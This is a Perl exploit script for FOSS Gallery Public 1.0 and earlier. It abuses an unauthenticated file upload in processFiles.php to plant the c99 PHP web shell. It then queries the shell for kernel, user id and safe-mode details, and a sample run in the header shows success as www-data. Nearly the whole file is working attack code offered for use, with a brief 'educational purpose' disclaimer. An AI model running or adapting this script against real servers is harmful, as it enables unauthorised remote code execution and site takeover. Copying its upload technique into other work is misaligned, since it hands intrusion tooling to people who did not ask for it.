# FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit
# url: http://downloads.sourceforge.net/fossgallery/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# OUTPUT:
#
# Exploited sucessfully.
#
# [+] Info:
#    Linux h4x0rz 2.6.18-6-686 #1 SMP Mon Aug 18 08:42:39 UTC 2008 i686
#    uid=33(www-data) gid=33(www-data) groups=33(www-data)
#    Safe Mode: OFF (not secure)
#
# joss@h4x0rz:~/Desktop$


use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Headers;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = "";
if (index(lc($SO),"win")!=-1){
		   $linux="0";
	    }else{
		    $linux="1";
	    }
		if($linux){
system("clear");
}
else{
system("cls");
}
}

my ($host, $file) = @ARGV ;

if (!$ARGV[0]) {

&lw;
print "\n[x] FOSS Gallery Public <= 1.0 Arbitrary Upload / Information c99 Expoit\n";
print "[x] written by JosS - sys-project[at]hotmail.com\n";
print "[x] http://www.spanish-hackers.com/\n\n";
print "Usage: $0 [host] [file] \n";
print "if doesn't exist the file: file default is phpshell C99\n\n";
exit;
}
if (!$ARGV[1])
{
$file="c99.php";
}

&lw;

$host = 'http://'.$host if ($host !~ /^http:/);
$host .= "/" if ($host !~ /\/\$/);

my $ua = LWP::UserAgent->new();
$ua->timeout(12);
my $request = HTTP::Request->new();
my $response;
my $header;
my $url = $host."processFiles.php";

$response = $ua->request(POST $url, Content_Type => 'form-data',
					Content => [ uploadNeed => "1", uploadFile0 => [$file]]);
$content = $response->content;

if ($content =~ /uploaded sucessful/) { print "\nExploited sucessfully.\n"; }
else { print "\nExploit failed\n"; exit;}

my $c99="c99.php"; 
chomp ($c99);

if ($file =~ /c99.php/)
{

$comando="?act=cmd&d=/&cmd=/&cmd_txt=1&submit=Execute";

print "\n";


my $final = $host.$c99.$comando;

my $ua = LWP::UserAgent->new;

my $req = HTTP::Request->new(GET => $final);

$ua->timeout(10);

$doc = $ua->request($req)->as_string;



$kernel = $1 if ( $doc =~ m/-a:&nbsp; (.*?)\<\/b>/mosix);
$id = $1 if ( $doc =~ m/<b>uid (.*?)\<\/b>/mosix);

$safe = $1 if ( $doc =~ m/color=green> (.*?)\<\/font>/mosix);



print "[+] Info:\n";

print "    $kernel\n";
print "    uid$id\n";

print "    Safe Mode: $safe\n";

print "\n";



}

__EOF__

